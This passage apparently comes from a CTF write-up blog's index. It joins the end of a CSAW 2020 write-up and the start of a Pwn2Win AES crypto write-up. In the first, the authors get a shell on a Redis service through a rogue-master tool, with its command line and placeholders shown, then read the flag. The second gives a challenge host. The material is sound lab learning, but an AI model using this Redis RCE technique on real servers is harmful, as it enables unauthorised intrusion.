In this step we had to get rce or read a file (flag), we had two options, crafting rce by ourself using raw Redis commands (our last option :3) or use tools, the redis-cli didn’t work so we couldn’t use the regular Redis attack using the config command, we found many tools, that uses the master-slave attack we tried some but I’m gonna mention only the tool that worked for us: https://github.com/n0b0dyCN/redis-rogue-server Making this tool working was an adventure, as I mentioned before we had an internet problem in our country :/ and the ssh wasn’t even working to get into our VPS, So here is how it has been done: we used digitalocean web console to set up the Redis redis-rogue-server. we had already turner connected and also the ncat connect to Redis as I mentioned before. the last step was to connect the Redis service from our local port 1337 to redis-rogue-server in our VPS, we used ngrok. ./redis-rogue-server.py --rhost [ngrok url] --rport [ngrok port] --lhost [vps public ip] then choose the Interactive shell: cat /flag.txt flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?} in this challenge, we learned a lot, it’s a good challenge that we really loved, big thanks to CSAW CTF 2020 organizer","date":"2020-09-14","objectID":"/csawquals20-webrtc/:1:2","tags":["symmetric-crypto","turn","redis","rce","csawquals20","web"],"title":"CsawQuals2020 WebRTC ","uri":"/csawquals20-webrtc/"},{"categories":["ctf-writeups"],"content":"Writeup for Pwn2Win CTF 2020, challenge name: Androids_Encryption","date":"2020-08-09","objectID":"/pwn2win2020-androids-encryption/","tags":["symmetric-crypto","aes","pwn2win-ctf","crypto"],"title":"Pwn2win2020 Androids Encryption","uri":"/pwn2win2020-androids-encryption/"},{"categories":["ctf-writeups"],"content":"Challenge Info ​ The challenge is a crypto challenge from the pwn2win event , it’s focused on the symmetric cryptography and especially the aes block cipher.So we are given remote connection nc encryption.pwn2.win 1337 and the python script that is running in the remote server.py .

The last function is enc_flag() it will encrypt the flag with key2 and iv2 which their difinition is : iv2 = AES.new(key1, AES.MODE_ECB).decrypt(iv1) key2 = xor(to_blocks(flag)) by looking at the xor function we noticed that if two parametres a,b are passed then it will calculate a xor b else if one parametre a is passed it will return a[0] xor \\x00 *len(a[0]) so it will return the first block xored with 00 and that meen it will return the first block .
